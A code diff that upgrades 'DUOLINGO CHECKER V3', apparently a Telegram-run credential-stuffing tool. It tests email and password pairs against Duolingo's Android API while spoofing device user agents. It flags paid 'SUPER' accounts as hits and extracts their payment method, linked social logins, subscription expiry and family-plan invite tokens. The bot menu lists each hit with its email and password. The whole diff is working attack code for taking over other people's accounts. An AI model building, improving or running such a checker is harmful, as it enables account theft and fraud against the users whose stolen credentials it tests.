@@ -67,43 +67,84 @@ def generate_ua():
     models = ["SM-G991B", "Pixel 6", "OnePlus 9", "Xiaomi Mi 11", "Pixel 7 Pro"]
     return f"Dalvik/2.1.0 (Linux; U; Android {versions[hash(str(time.time())) % len(versions)]}; {models[hash(str(time.time())) % len(models)]} Build/RP1A.200720.012)"
 
+# ========== FIXED: PAYMENT METHOD DETECTION ==========
 def detect_payment_method(data):
-    """Detect payment method from subscription data"""
-    shop_items = data.get("shopItems", [])
-    payment_method = "Unknown 💳"
+    """Detect payment method from subscription data - FIXED VERSION"""
     
+    # Method 1: Check subscription object directly (current API)
+    subscription = data.get("subscription", {})
+    if subscription:
+        # Check billing info
+        billing_info = subscription.get("billingInfo", {})
+        if billing_info:
+            processor = billing_info.get("paymentProcessor", "").lower()
+            if "google" in processor:
+                return "Google Play 🟢"
+            elif "apple" in processor:
+                return "Apple App Store 🍎"
+            elif "paypal" in processor:
+                return "PayPal 💙"
+        
+        # Check product ID
+        product_id = subscription.get("productId", "")
+        if "google" in product_id.lower():
+            return "Google Play 🟢"
+        elif "apple" in product_id.lower() or "ios" in product_id.lower():
+            return "Apple App Store 🍎"
+        elif "paypal" in product_id.lower():
+            return "PayPal 💙"
+    
+    # Method 2: Check shopItems
+    shop_items = data.get("shopItems", [])
     for item in shop_items:
         sub_info = item.get("subscriptionInfo", {})
         if sub_info:
-            # Check for payment method indicators
-            sku = sub_info.get("productId", "").lower()
-            
-            if "google" in sku or "android" in sku:
-                payment_method = "Google Play 🟢"
-            elif "apple" in sku or "ios" in sku or "itunes" in sku:
-                payment_method = "Apple App Store 🍎"
-            elif "paypal" in sku:
-                payment_method = "PayPal 💙"
-            elif "visa" in sku or "mastercard" in sku or "amex" in sku:
-                payment_method = "Credit Card 💳"
-            elif "direct" in sku:
-                payment_method = "Direct Debit 🏦"
-            
-            # Check receipt data if available
+            # Check receipt
             receipt = sub_info.get("receipt", {})
             if receipt:
-                if "google" in str(receipt).lower():
-                    payment_method = "Google Play 🟢"
-                elif "apple" in str(receipt).lower():
-                    payment_method = "Apple App Store 🍎"
+                receipt_str = str(receipt).lower()
+                if "google" in receipt_str:
+                    return "Google Play 🟢"
+                elif "apple" in receipt_str or "itunes" in receipt_str:
+                    return "Apple App Store 🍎"
+            
+            # Check SKU
+            sku = sub_info.get("productId", "").lower()
+            if "google" in sku:
+                return "Google Play 🟢"
+            elif "apple" in sku or "ios" in sku:
+                return "Apple App Store 🍎"
+        
+        # Check transaction ID
+        if "originalTransactionId" in str(item):
+            transaction = str(item.get("originalTransactionId", "")).lower()
+            if "google" in transaction:
+                return "Google Play 🟢"
+            elif "apple" in transaction:
+                return "Apple App Store 🍎"
     
-    return payment_method
+    # Method 3: Raw JSON search
+    data_str = str(data).lower()
+    if "google play" in data_str or ("android" in data_str and "purchase" in data_str):
+        return "Google Play 🟢"
+    elif "apple" in data_str and ("store" in data_str or "itunes" in data_str):
+        return "Apple App Store 🍎"
+    elif "paypal" in data_str:
+        return "PayPal 💙"
+    
+    # Method 4: Check if it's premium but no method found
+    if data.get("hasPlus") or data.get("has_item_premium_subscription"):
+        if "free" not in data_str and "trial" not in data_str:
+            return "Web Purchase 🌐"
+    
+    return "Unknown 💳"
 
+# ========== FIXED: SOCIAL LINKS DETECTION ==========
 def detect_social_links(data):
-    """Detect linked social accounts"""
+    """Detect linked social accounts - IMPROVED VERSION"""
     social_links = []
     
-    # Check for linked accounts
+    # Check linkedAccounts array
     linked_accounts = data.get("linkedAccounts", [])
     for account in linked_accounts:
         provider = account.get("provider", "").lower()
@@ -114,13 +155,94 @@ def detect_social_links(data):
         elif "apple" in provider:
             social_links.append("Apple ID 🍎")
     
-    # Check user profile for social info
+    # Check boolean flags
     if data.get("hasFacebookId"):
-        social_links.append("Facebook 🔵")
+        if "Facebook 🔵" not in social_links:
+            social_links.append("Facebook 🔵")
     if data.get("hasGoogleId"):
-        social_links.append("Google 🔴")
+        if "Google 🔴" not in social_links:
+            social_links.append("Google 🔴")
+    
+    # Check user profile for social info
+    profile = data.get("profile", {})
+    if profile:
+        if profile.get("facebookId"):
+            if "Facebook 🔵" not in social_links:
+                social_links.append("Facebook 🔵")
+        if profile.get("googleId"):
+            if "Google 🔴" not in social_links:
+                social_links.append("Google 🔴")
+    
+    # Check for email (always counts as contact method)
+    if data.get("email"):
+        pass  # Don't add as social
     
     return social_links if social_links else ["None ❌"]
+
+# ========== FIXED: SUBSCRIPTION DETAILS ==========
+def extract_subscription_details(data):
+    details = {
+        "product_id": "Unknown",
+        "renewing": "Unknown",
+        "expiry": "Unknown",
+        "invite_token": None,
+        "payment_method": "Unknown",
+        "billing_cycle": "Unknown"
+    }
+    
+    # NEW: Check subscription object directly (current API structure)
+    subscription = data.get("subscription", {})
+    if subscription:
+        if subscription.get("productId"):
+            details["product_id"] = subscription.get("productId")
+        if subscription.get("renewing") is not None:
+            details["renewing"] = "Yes ✅" if subscription.get("renewing") else "No ❌"
+        if subscription.get("expirationTime"):
+            expiry_ms = subscription.get("expirationTime")
+            details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
+        elif subscription.get("expectedExpiration"):
+            expiry_ms = subscription.get("expectedExpiration")
+            details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
+        if subscription.get("billingPeriod"):
+            period = subscription.get("billingPeriod", "").lower()
+            if "month" in period:
+                details["billing_cycle"] = "Monthly 📅"
+            elif "year" in period:
+                details["billing_cycle"] = "Yearly 📆"
+            elif "week" in period:
+                details["billing_cycle"] = "Weekly 📅"
+    
+    # Original shopItems check (backward compatibility)
+    shop_items = data.get("shopItems", [])
+    for item in shop_items:
+        sub_info = item.get("subscriptionInfo", {})
+        if sub_info:
+            if not details["product_id"] or details["product_id"] == "Unknown":
+                if sub_info.get("productId"):
+                    details["product_id"] = sub_info.get("productId")
+                    # Detect billing cycle from product ID
+                    pid = sub_info.get("productId", "").lower()
+                    if details["billing_cycle"] == "Unknown":
+                        if "monthly" in pid or "month" in pid:
+                            details["billing_cycle"] = "Monthly 📅"
+                        elif "yearly" in pid or "annual" in pid or "year" in pid:
+                            details["billing_cycle"] = "Yearly 📆"
+                        elif "weekly" in pid or "week" in pid:
+                            details["billing_cycle"] = "Weekly 📅"
+            if details["renewing"] == "Unknown" and sub_info.get("renewing") is not None:
+                details["renewing"] = "Yes ✅" if sub_info.get("renewing") else "No ❌"
+            if details["expiry"] == "Unknown" and sub_info.get("expectedExpiration"):
+                expiry_ms = sub_info.get("expectedExpiration")
+                details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
+        
+        family_info = item.get("familyPlanInfo", {})
+        if family_info and family_info.get("inviteToken"):
+            details["invite_token"] = family_info.get("inviteToken")
+    
+    # Detect payment method (using updated function)
+    details["payment_method"] = detect_payment_method(data)
+    
+    return details
 
 def is_premium_account(data):
     shop_items = data.get("shopItems", [])
@@ -138,6 +260,12 @@ def is_premium_account(data):
             if product_id and product_id != "N/A":
                 return True, "SUPER", None
     
+    # Check subscription object directly
+    subscription = data.get("subscription", {})
+    if subscription:
+        if subscription.get("productId") and "trial" not in subscription.get("productId", "").lower():
+            return True, "SUPER", None
+    
     if data.get("has_item_premium_subscription") == True:
         return True, "SUPER", None
     
@@ -145,45 +273,6 @@ def is_premium_account(data):
         return True, "SUPER", None
     
     return False, "FREE", None
-
-def extract_subscription_details(data):
-    details = {
-        "product_id": "Unknown",
-        "renewing": "Unknown",
-        "expiry": "Unknown",
-        "invite_token": None,
-        "payment_method": "Unknown",
-        "billing_cycle": "Unknown"
-    }
-    
-    shop_items = data.get("shopItems", [])
-    for item in shop_items:
-        sub_info = item.get("subscriptionInfo", {})
-        if sub_info:
-            if sub_info.get("productId"):
-                details["product_id"] = sub_info.get("productId")
-                # Detect billing cycle from product ID
-                pid = sub_info.get("productId", "").lower()
-                if "monthly" in pid or "month" in pid:
-                    details["billing_cycle"] = "Monthly 📅"
-                elif "yearly" in pid or "annual" in pid or "year" in pid:
-                    details["billing_cycle"] = "Yearly 📆"
-                elif "weekly" in pid or "week" in pid:
-                    details["billing_cycle"] = "Weekly 📅"
-            if sub_info.get("renewing") is not None:
-                details["renewing"] = "Yes ✅" if sub_info.get("renewing") else "No ❌"
-            if sub_info.get("expectedExpiration"):
-                expiry_ms = sub_info.get("expectedExpiration")
-                details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
-        
-        family_info = item.get("familyPlanInfo", {})
-        if family_info and family_info.get("inviteToken"):
-            details["invite_token"] = family_info.get("inviteToken")
-    
-    # Detect payment method
-    details["payment_method"] = detect_payment_method(data)
-    
-    return details
 
 def check_single_account(email, password):
     if stop_flag:
@@ -224,7 +313,7 @@ def check_single_account(email, password):
         if not jwt_token:
             return email, password, "FAIL", "no jwt token", None
         
-        profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2Chas_item_premium_subscription%2CcreatedAt%2ClinkedAccounts%2ChasFacebookId%2ChasGoogleId"
+        profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2Chas_item_premium_subscription%2CcreatedAt%2ClinkedAccounts%2ChasFacebookId%2ChasGoogleId%2Csubscription%2Cprofile"
         
         profile_headers = get_headers(ua, jwt_token)
         
@@ -255,7 +344,7 @@ def check_single_account(email, password):
         
         is_premium, plan_type, invite_token = is_premium_account(data)
         
-        # Get social links
+        # Get social links (IMPROVED)
         social_links = detect_social_links(data)
         social_text = ", ".join(social_links)
         
@@ -330,7 +419,7 @@ def send_main_menu(chat_id):
     menu_text = f"""
 ╔══════════════════════════════════════╗
 ║        🦉 DUOLINGO CHECKER V3        ║
-║              Thu Ya Aung Zaw         ║
+║         Thu Ya Aung Zaw      ║
 ╚══════════════════════════════════════╝
 
 ┌──────────────────────────────────────┐
@@ -375,7 +464,6 @@ def send_hits_list(chat_id, page=0):
     
     all_hits = []
     for email, pwd, result in all_super_hits:
-        # Extract compact info from result
         lines = result.split('\n')
         username = "Unknown"
         xp = "0"
@@ -394,7 +482,7 @@ def send_hits_list(chat_id, page=0):
                         streak = part.replace('🔥', '').replace('days', '').strip()
             if '⏰ Expires:' in line:
                 expiry = line.split('⏰ Expires:')[1].strip()
-            if '💳' in line and '💳' in line:
+            if '💳' in line:
                 payment = line.split('💳')[1].strip()
         all_hits.append(("👑 SUPER", email, pwd, username, xp, streak, expiry, payment))
     
